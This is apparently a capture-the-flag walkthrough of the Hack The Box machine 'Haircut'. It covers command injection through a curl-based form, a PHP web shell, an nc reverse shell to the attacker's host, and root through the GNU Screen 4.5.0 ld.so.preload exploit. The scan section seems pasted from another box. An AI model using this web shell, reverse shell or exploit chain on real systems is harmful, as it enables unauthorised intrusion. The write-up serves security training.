# Scan

```bash
ghost@localhost [16:32:47] [~/Documents/hacking/tj-null-boxes/beep] [master]
-> % rustscan -a $IP -- -sC -sV

Open 10.10.10.7:22
Open 10.10.10.7:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e975c1e4b3633c93f2c618083648ce36 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDo4pezhJs9c3u8vPWIL9eW4qxQOrHCslAdMftg/p1HDLCKc+9otg+MmQMlxF7jzEu8vJ0GPfg5ONRxlsfx1mwmAXmKLh9GK4WD2pFbg4iFiAO/BAUjs3dNdR1S9wR6F+yRc2jgIyKFJO3JohZZFnM6BrTkZO7+IkSF6b3z2qzaWorHZW04XHdbxKjVCHpU5ewWQ5B32ScKRJE8bsi04Z2lE5vk1NWK15gOqmuyEBK8fcQpD1zCI6bPc5qZlwrRv4r4krCb1h8zYtAwVnoZdtYVopfACgWHxqe+/8YqS8qo4nPfEXq8LkUc2VWmFztWMCBuwVFvW8Pf34VDD4dEiIwz
|   256 8700aba98f6f4bbafbc67a55a860b268 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLrPH0YEefX9y/Kyg9prbVSPe3U7fH06/909UK8mAIm3eb6PWCCwXYC7xZcow1ILYvxF1GTaXYTHeDF6VqX0dzc=
|   256 b61b5ca9265cdc61b775906c88516e54 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA+vUE7P+f2aiWmwJRuLE2qsDHrzJUzJLleMvKmIHoKM
80/tcp open  http    syn-ack nginx 1.10.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD
|_http-title:  HTB Hairdresser
|_http-server-header: nginx/1.10.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


# 80

```bash
ghost@localhost [16:39:03] [~/Documents/hacking/tj-null-boxes/haircut] [master]
-> % feroxbuster -u http://10.10.10.24:80 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -k

200      GET        7l       15w      144c http://10.10.10.24/
301      GET        7l       13w      194c http://10.10.10.24/uploads => http://10.10.10.24/uploads/
403      GET        7l       11w      178c http://10.10.10.24/uploads/
```

I downloaded the image and check if it is stenography and it is not.

Nothing interesting there, I checked `/index.html` and it returns the homepage. This time,  I try with `medium` word list. This time I found `exposed.php`.

```bash
ghost@localhost [16:46:20] [~/Documents/hacking/tj-null-boxes/haircut] [master *]
-> % feroxbuster -u http://10.10.10.24:80 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -k -x php

200      GET        7l       15w      144c http://10.10.10.24/
301      GET        7l       13w      194c http://10.10.10.24/uploads => http://10.10.10.24/uploads/
403      GET        7l       11w      178c http://10.10.10.24/uploads/
200      GET       19l       41w        0c http://10.10.10.24/exposed.php
```

It is an input form, and if I enter my IP address, the target machine will access my Python server. Also my entering an invalid host name, I can see the error message and it shows that it is using curl.

```bash
% Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0 0 0 0 0 0 0 0 0 --:--:-- 0:00:01 --:--:-- 0 0 0 0 0 0 0 0 0 --:--:-- 0:00:02 --:--:-- 0 0 0 0 0 0 0 0 0 --:--:-- 0:00:03 --:--:-- 0 0 0 0 0 0 0 0 0 --:--:-- 0:00:04 --:--:-- 0 0 0 0 0 0 0 0 0 --:--:-- 0:00:05 --:--:-- 0 0 0 0 0 0 0 0 0 --:--:-- 0:00:06 --:--:-- 0 0 0 0 0 0 0 0 0 --:--:-- 0:00:07 --:--:-- 0 0 0 0 0 0 0 0 0 --:--:-- 0:00:08 --:--:-- 0 0 0 0 0 0 0 0 0 --:--:-- 0:00:09 --:--:-- 0curl: (6) Could not resolve host: somewhere
```

I tried `;` and `|`, they both failed. Seems to be filtering. However, `$` is not failing. Therefore, I can use that to inject a malicious command in between together with `-o` command from curl.

So I hosted a PHP payload script on local, and download it under `/var/www/html/uploads`.

```bash
10.10.14.8/payload.php%20-o%20/var/www/html/uploads/payload.php
```

This is the PHP payload.

```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

Then with the following script, I can get back the reverse shell.

```bash
nc -nv 10.10.14.8 4444 -e /bin/bash


ghost@localhost [17:21:29] [~/Documents/hacking/tj-null-boxes/haircut] [master *]
-> % nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.24] 45854
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


# Privilege escalation

Nothing interesting with Linpeas, so I manually check SUID permissions.

```bash
www-data@haircut:/dev/shm$ find / -perm -4000 2>/dev/null | xargs ls -la
-rwsr-xr-x 1 root   root         30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root   root         40152 Dec 16  2016 /bin/mount
-rwsr-xr-x 1 root   root        142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root   root         44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root   root         44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root   root         40128 May  4  2017 /bin/su
-rwsr-xr-x 1 root   root         27608 Dec 16  2016 /bin/umount
-rwsr-sr-x 1 daemon daemon       51464 Jan 14  2016 /usr/bin/at
-rwsr-xr-x 1 root   root         49584 May  4  2017 /usr/bin/chfn
-rwsr-xr-x 1 root   root         40432 May  4  2017 /usr/bin/chsh
-rwsr-xr-x 1 root   root         75304 May  4  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root         32944 May  4  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root   root         39904 May  4  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root   root         32944 May  4  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root   root         54256 May  4  2017 /usr/bin/passwd
-rwsr-xr-x 1 root   root         23376 Jan 18  2016 /usr/bin/pkexec
-rwsr-xr-x 1 root   root       1588648 May 19  2017 /usr/bin/screen-4.5.0
-rwsr-xr-x 1 root   root        136808 Jan 20  2017 /usr/bin/sudo
-rwsr-xr-- 1 root   messagebus   42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root         10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root   root        428240 Mar 16  2017 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root         14864 Jan 18  2016 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root   root        208680 Apr 29  2017 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root   root         38984 Mar  7  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
```

So I found an interesting SUID `screen-4.5.0`. From searchsploit, I can see that it is vulnerable to local privilege escalation.

```bash
ghost@localhost [18:37:37] [~/Documents/hacking/tj-null-boxes/haircut] [master *]
-> % searchsploit screen 4.5
------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                          |  Path
------------------------------------------------------------------------ ---------------------------------
GNU Screen 4.5.0 - Local Privilege Escalation                           | linux/local/41154.sh
GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                     | linux/local/41152.txt
------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
Papers: No Results
```

But the automated scripts failed because it cannot find `cc1` on the target machine. I tried compiling on local, but also failed because my system has `Glibc` higher than the target machine.

One possible solution is by installing older glibc or compile inside the docker. But it is too much work. Instead I followed this blog post (https://ivanitlearning.wordpress.com/2020/08/25/compiling-setuid0-code/) and the solution is to find where `cc1` is installed in the target system.

First upload the exploits onto the target machine.

```bash
$ curl 10.10.14.8/libhax.c -o /tmp/libhax.c

$ curl 10.10.14.8/rootshell.c -o /tmp/rootshell.c
```

Then find `cc1`.

```bash
$ /tmp $ locate cc1
/etc/ssl/certs/6fcc125d.0
/lib/modules/4.4.0-77-generic/kernel/drivers/iio/adc/cc10001_adc.ko
/lib/modules/4.4.0-78-generic/kernel/drivers/iio/adc/cc10001_adc.ko
/usr/lib/gcc/x86_64-linux-gnu/5/cc1
/usr/lib/gcc/x86_64-linux-gnu/5/libcc1.so
/usr/lib/gcc/x86_64-linux-gnu/5/plugin/libcc1plugin.so
/usr/lib/gcc/x86_64-linux-gnu/5/plugin/libcc1plugin.so.0
/usr/lib/gcc/x86_64-linux-gnu/5/plugin/libcc1plugin.so.0.0.0
/usr/lib/x86_64-linux-gnu/libcc1.so.0
/usr/lib/x86_64-linux-gnu/libcc1.so.0.0.0
/usr/share/doc/libcc1-0
/usr/share/doc/libgcc1
/usr/share/doc/libisccc140
/usr/share/doc/libisccc140/changelog.Debian.gz
/usr/share/doc/libisccc140/copyright
/usr/share/lintian/overrides/libgcc1
/usr/share/terminfo/x/xterm+pcc1
/usr/src/linux-headers-4.4.0-77-generic/include/config/cc10001
/usr/src/linux-headers-4.4.0-77-generic/include/config/cc10001/adc.h
/usr/src/linux-headers-4.4.0-78-generic/include/config/cc10001
/usr/src/linux-headers-4.4.0-78-generic/include/config/cc10001/adc.h
/var/lib/dpkg/info/libcc1-0:amd64.list
/var/lib/dpkg/info/libcc1-0:amd64.md5sums
/var/lib/dpkg/info/libcc1-0:amd64.shlibs
/var/lib/dpkg/info/libcc1-0:amd64.symbols
/var/lib/dpkg/info/libcc1-0:amd64.triggers
/var/lib/dpkg/info/libgcc1:amd64.list
/var/lib/dpkg/info/libgcc1:amd64.md5sums
/var/lib/dpkg/info/libgcc1:amd64.postinst
/var/lib/dpkg/info/libgcc1:amd64.shlibs
/var/lib/dpkg/info/libgcc1:amd64.symbols
/var/lib/dpkg/info/libgcc1:amd64.triggers
/var/lib/dpkg/info/libisccc140:amd64.list
/var/lib/dpkg/info/libisccc140:amd64.md5sums
/var/lib/dpkg/info/libisccc140:amd64.shlibs
/var/lib/dpkg/info/libisccc140:amd64.triggers
/var/tmp/systemd-private-ccc1121e12414e109a058b30dc8b6713-systemd-timesyncd.service-AOmIUo
```

Once it is found, we updated the path.

```bash
$ export PATH=$PATH:/usr/lib/gcc/x86_64-linux-gnu/5
```

Then compile both shared library and the executable.

```bash
$ gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c

$ gcc -o /tmp/rootshell /tmp/rootshell.c
```

After that following the script and executes

```bash
$ cd /etc

$ umask 000

$ screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"

$ screen -ls # screen itself is setuid, so...

$ /tmp/rootshell

# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)

# cat /home/maria/user.txt
7b1b9d3f75797a337576dbadc7ffc96e

# cat /root/root.txt
7ce42237f2cd6b9ed30e9f526693e284
```
